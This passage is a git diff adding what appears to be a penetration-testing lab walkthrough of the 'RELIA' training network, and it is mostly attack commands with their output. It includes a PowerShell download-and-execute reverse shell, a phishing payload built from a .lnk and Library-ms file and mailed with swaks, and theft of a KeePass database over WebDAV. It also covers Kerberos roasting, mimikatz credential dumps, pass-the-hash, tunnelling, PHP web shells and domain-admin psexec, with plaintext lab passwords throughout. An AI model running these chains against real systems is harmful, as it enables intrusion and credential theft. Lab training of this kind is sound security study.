@@ -381,4 +381,310 @@ index 77e370c..0000000
 # I think thats far I can go with the staging folder.. Lets try the mimikatz.. Unfortunately damon permisison does not enough to capture from memory, lets access to NT/AUTHORITY using godpotato
 PS C:\users\public\Downloads> .\godpotato.exe -cmd "C:\users\public\Downloads\met.exe"
 
-# Based on above email we know that is something breaks we can contact jim@relia.com as he is the mail server admin. We can follow to our 
+# Based on above email we know that is something breaks we can contact jim@relia.com as he is the mail server admin. We can follow to our chapter 11.3 send the payload through phishing
+pip3 install wsgidav
+mkdir /home/kali/webdav
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/RELIA/WEBDAV
+
+# Kali command prompt
+mkdir /home/kali/Desktop/RELIA/WEBDAV
+pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('http://192.168.45.165:8088/Reverse-Shell/powercat.ps1');powercat -c 192.168.45.165 -p 8443 -e cmd.exe -ge" > revshell-pwsh.txt
+
+# Create shortcut lnk file auto-config.lnk and put the command below
+powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.45.165/revshell-pwsh.txt'); iex 'powershell -E $code'""
+
+# Create a Microsoft Library file "config.Library-ms" and change the URL tags
+```
+<url>http://192.168.45.165</url>
+```
+# Copy "config.Library-ms" and "automatic_configuration.lnk" file to the webdav folder
+# Now payload had prepared, now we can send the Payload through email using swaks.
+swaks -t jim@relia.com -s 192.168.162.189 -f damon@relia.com --body "Help about breaks, please check the attachment"  --attach @config.Library-ms --header "Subject: Breaks help" 
+
+# Wait for a while and go to listener
+C:\Windows\System32\WindowsPowerShell\v1.0>whoami
+relia\jim
+PS C:\Users\offsec> type Desktop\proof.txt
+PS C:\Users\offsec> ipconfig
+...
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 172.16.122.14
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.122.254
+...
+PS C:\Users\jim\Desktop> hostname
+WK01
+PS C:\Users\jim\Desktop> type local.txt
+
+# Seem like we successfully get into WK01 machine, then inside Jim Documents, we can see there is a Database.kdbx, lets transfer it to Kali machine using WEBDAV methods
+```
+$uri = "\\192.168.45.165\DavWWWRoot"
+Remove-PSDrive WebDavShare -Force -ea 0
+New-PSDrive -Name WebDavShare -PSProvider FileSystem -Root $uri
+Get-ChildItem WebDavShare:\\
+Copy-Item "C:\Users\jim\Documents\Database.kdbx" "WebDavShare:\Database.kdbx"
+```
+
+keepass2john Database.kdbx > keepass.hash
+cat keepass.hash
+# remove database prefix
+code keepass.hash 
+hashcat --help | grep -i "KeePass"
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+...
+mercedes1
+...
+PS C:\Users\jim\Documents> net user /domain
+...
+User accounts for \\DC02.relia.com
+Administrator            andrea      anna                     
+brad                     dan         Guest                    
+iis_service       internaladmin        jenny                    
+jim             krbtgt          larry                    
+maildmz          michelle       milana     
+mountuser  
+...
+# Update [int-creds.md] and [user.txt] and [pass.txt]
+C:\Users>ping mail.relia.com
+...
+Reply from 172.16.122.5: bytes=32 time<1ms TTL=128
+...
+# Mail server actually do have two IPs
+
+# LOGIN Machine
+hydra -L user.txt -P pass.txt 192.168.162.191 rdp
+...
+[3389][rdp] host: 192.168.162.191   login: dmzadmin   password: SlimGodhoodMope
+...
+xfreerdp /u:dmzadmin /p:SlimGodhoodMope /v:192.168.162.191 /cert-ignore
+Get-ChildItem -Path C:\Users -Filter *.txt -Recurse
+PS C:\Users\dmzadmin\Desktop> cat proof.txt
+PS C:\Users> ipconfig
+   IPv4 Address. . . . . . . . . . . : 192.168.162.191
+   IPv4 Address. . . . . . . . . . . : 172.16.122.254
+# So it is a Gateway PC as well. We can use Chisel on it to act as a Gateway PC.
+# Lets upload met.exe and Chisel to reverse proxy to INT network.
+# Create two shell to Msfconsole one for Chisel Client one for maintaining access
+./chisel server -p 8899 --reverse --socks5
+./chisel.exe client 192.168.45.165:8899 R:socks
+sudo nano /etc/proxychains4.conf
+...
+socks5 127.0.0.1 1080
+...
+# We also need to turn off the firewall
+netsh advfirewall set allprofiles state off
+netsh advfirewall firewall add rule name="Open All Ports" dir=in action=allow protocol=TCP localport=0-65535
+
+# We knew jim is the domain user and DC02 is .6, we can straight away use GetNPUsers to find who doesn't require Kerberos(UF_DONT_REQUIRE_PREAUTH) user.
+proxychains -q impacket-GetUserSPNs relia.com/jim:'Castello1!' -request -dc-ip 172.16.122.6
+# We get the IIS service but no use for iis_service users
+[iis_service-tgs.hash]
+
+# Lets try the AS-REP Roasting
+proxychains -q impacket-GetNPUsers relia.com/jim:'Castello1!' -request -dc-ip 172.16.122.6 
+[michelle-asreproast.hash]
+
+hashcat --help | grep -i "kerberos"
+...
+13100 | Kerberos 5, etype 23, TGS-REP       | Network Protocol
+18200 | Kerberos 5, etype 23, AS-REP        | Network Protocol
+...
+
+hashcat -m 18200 michelle-asreproast.hash /usr/share/wordlists/rockyou.txt
+...
+NotMyPassword0k?
+...
+# update to [pass.txt]
+
+# INTRANET
+proxychains -q xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.122.7 /cert-ignore +drive:/home/kali/Desktop,/smb
+PS C:\Users\michelle\Desktop> type local.txt
+# Lets try the mimikatz, but unfortunately it seem like dont have privilege to perform. Lets see what are the port running that we can exploit
+netstat -an
+# On the port 80 is actually running a WordPress websites
+# Lets try the WinPEAS to check any privilege escalation can be made
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+
+# Meanwhile find any sensitive file
+Get-ChildItem -Path C:\ -Include *.kdbx,*.txt,*.ini,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+...
+C:\xampp\passwords.txt
+C:\xampp\webdav
+C:\xampp\mysql\bin\my.ini
+C:\xampp\mysql\data\my.ini
+C:\xampp\mysql\backup\my.ini
+C:\xampp\php\docs\Archive_Tar\docs\Archive_Tar.txt
+...
+
+# We can upload a pw0ny-shell.php to xampp directory and access from WEB
+Dir: C:\xampp\htdocs\xampp
+http://127.0.0.1/xampp/pw0ny-shell.php
+INTRANET$@INTRANET:C:\xampp\htdocs\xampp# whoami
+nt authority\system
+# Upload the met.exe file to same directory and revert to MSFConsole
+[*] Command shell session 3 opened (192.168.45.165:8888 -> 192.168.162.191:63164) at 2024-06-02 17:29:42 +0800
+sessions -i 3
+PS C:\Users\Administrator\Desktop> type proof.txt
+# mimikatz
+mimikatz # privielege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+...
+Administrator
+  Hash NTLM: 8b4547a5116dd13e6e206d1286a06b28
+...
+# Use passthehash 
+proxychains -q evil-winrm -i 172.16.122.7 -u administrator -H 8b4547a5116dd13e6e206d1286a06b28
+whoami
+intranet\administrator
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+proxychains -q xfreerdp /v:172.16.122.7 /u:administrator /pth:8b4547a5116dd13e6e206d1286a06b28
+
+# Finally found out we shall use the latest Mimikatz versions.... for the fuck sake
+https://github.com/gentilkiwi/mimikatz/releases
+# We  shall follow the below guide as sometime
+https://skelsec.medium.com/lsass-needs-an-iv-57b7333d50d8
+mimikatz # privielege::debug
+mimikatz # sekurlsa::logonpasswords
+...
+        kerberos :
+         * Username : andrea
+         * Domain   : RELIA.COM
+         * Password : PasswordPassword_6
+...
+# Thats good for now, lets check what can andrea access
+proxychains -q crackmapexec rdp int-iplist.txt -u andrea -p 'PasswordPassword_6' --continue-on-success
+...
+RDP         172.16.122.15   3389   WK02             [+] relia.com\andrea:PasswordPassword_6 (Pwn3d!)
+...
+
+# WK02
+proxychains -q xfreerdp /u:andrea /p:PasswordPassword_6 /v:172.16.122.15 /cert-ignore +drive:/home/kali/Desktop,/smb
+# Local.txt file is showing on the desktop
+# On the Drive C there is a PS file, we can edit and change to execute our met.exe. Upload the met.exe and renamed to beyondupdater.exe, then edit the schedule script
+...
+copy C:\Users\andrea\beyondupdater.exe C:\updater\beyondupdater.exe
+...
+# Wait until payload executed
+[*] Command shell session 6 opened (192.168.45.165:8888 -> 192.168.162.191:62890) at 2024-06-02 19:01:00 +0800
+C:\Windows\system32>whoami
+relia\milana
+PS C:\Users\milana\Desktop> type proof.txt
+# Found a kdbx on Milana Documents
+PS C:\Users\milana\Documents> cp Database.kdbx C:\Users\andrea\Desktop\database.kdbx
+# Transfer back to kali and john crack the password where we get it as destiny1
+# We get Sarah id-rsa from the keepass DB
+chmod 600 sarah_id-rsa
+# Thats all for now, we shall proceed to .19 as it open the port 22
+
+# BACKUP
+proxychains -q ssh -i sarah_id-rsa sarah@172.16.122.19 
+# Error in libcrypto again.. Lets create a new PEM with MobaXterm and named it to sarahkey
+proxychains -q ssh -o StrictHostKeyChecking=no -i sarahkey sarah@172.16.122.19 
+cat local.txt
+# Check cronjob
+cat /etc/cron.d/backup
+* * * * * root /root/createbackup.sh
+# We dont have permission to view it
+# From the /opt folder we see there is a borgbackup 
+sarah@backup:/opt$ sudo /usr/bin/borg list *
+Enter passphrase for key /opt/borgbackup: 
+# However it required the passphrase. Since we know that it should have a createbackup.sh in root directory for cronjobs means it shall have the execution, we can monitor it through htop
+...
+/bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg delete /opt/borgbackup::usb_1706843372
+...
+sudo /usr/bin/borg list *
+sudo /usr/bin/borg extract --stdout borgbackup::home
+xinyVzoH2AnJpRK9sfMgBA
+...
+sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
+{
+    "user": "amy",
+    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
+}
+...
+# Now we got the amy password in md5 decrypt and we will get 
+https://www.md5online.org/md5-decrypt.html
+backups1
+sudo -l
+# Amy doesn't required password and it can directly access to root
+sudo su
+root@backup:~# cat proof.txt
+
+# Based on the previous script, we knew that we can access to andrew with password on .20
+
+# PRODUCTION
+proxychains -q ssh -o StrictHostKeyChecking=no andrew@172.16.122.20 
+# Found a doas command in /usr/local/etc/
+cat doas.conf
+...
+permit nopass andrew as root cmd service args apache24 onestart
+...
+# Andrew user can use root privilege to execute apache24 onestart
+doas service apache24 onestart
+# Lets upload our pw0ny-shell.php to apache server directory
+# Found a writeable path
+/usr/local/www/apache24/data/phpMyAdmin/tmp
+# Upload the revshell php
+wget http://192.168.45.165:8088/Reverse-Shell/php-revsh.php
+# Use curl to activate it
+proxychains -q curl http://172.16.122.20/phpMyAdmin/tmp/php-revsh.php
+
+/usr/local/bin/doas su root
+whoami
+root
+cd /root
+cat proof.txt
+cd /home/andrew
+cat local.txt
+cd /home/mountuser
+cat .history
+...
+sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21
+...
+# Lets proceed to .21
+
+# FILES
+proxychains -q ssh -o StrictHostKeyChecking=no mountuser@172.16.122.21 
+ssh: connect to host 172.16.122.21 port 22: Connection refused
+# Not sure why it is saying connection refused
+# Lets nmap scan and see what is the port
+proxychains -q nmap -sT -Pn 172.16.221.21
+Discovered open port 139/tcp on 172.16.122.21
+Discovered open port 445/tcp on 172.16.122.21
+Discovered open port 135/tcp on 172.16.122.21
+# We discover the smb port is enable, lets try smbclient
+proxychains smbclient 
+Discovered open port 139/tcp on 172.16.122.21
+Discovered open port 445/tcp on 172.16.122.21
+Discovered open port 135/tcp on 172.16.122.21
+
+proxychains -q smbclient -L //172.16.122.21/ -U mountuser -W relia.com --password='DRtajyCwcbWvH/9'
+        apps            Disk      
+        monitoring      Disk      
+        scripts         Disk
+
+proxychains -q smbclient //172.16.122.21/monitoring -U mountuser -W relia.com --password='DRtajyCwcbWvH/9'
+# Found some Powershell file, get all to the KALI. Found the administrator credentials from PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt
+...
+RELIA\Administrator
+vau!XCKjNQBv2$
+...
+# Directly go with impacket-psexec
+proxychains -q impacket-psexec 'relia.com/administrator:vau!XCKjNQBv2$'@172.16.122.21
+PS C:\Users\Administrator\Desktop> type proof.txt
+
+# WEBBY
+proxychains -q impacket-psexec 'relia.com/administrator:vau!XCKjNQBv2$'@172.16.122.30
+Get-ChildItem -Path C:\Users -Include proof.txt,local.txt -File -Recurse -ErrorAction SilentlyContinue
+PS C:\Users\Administrator\Desktop> type proof.txt
+
+# DC02
+proxychains -q impacket-psexec 'relia.com/administrator:vau!XCKjNQBv2$'@172.16.122.06
+PS C:\> type C:\Users\Administrator\Desktop\proof.txt
+
+# Now we have the Domain Admin, we can access to the MAIL server as well to capture the proof.txt
+proxychains -q impacket-psexec 'relia.com/administrator:vau!XCKjNQBv2$'@172.16.122.5
+PS C:\> type C:\Users\Administrator\Desktop\proof.txt
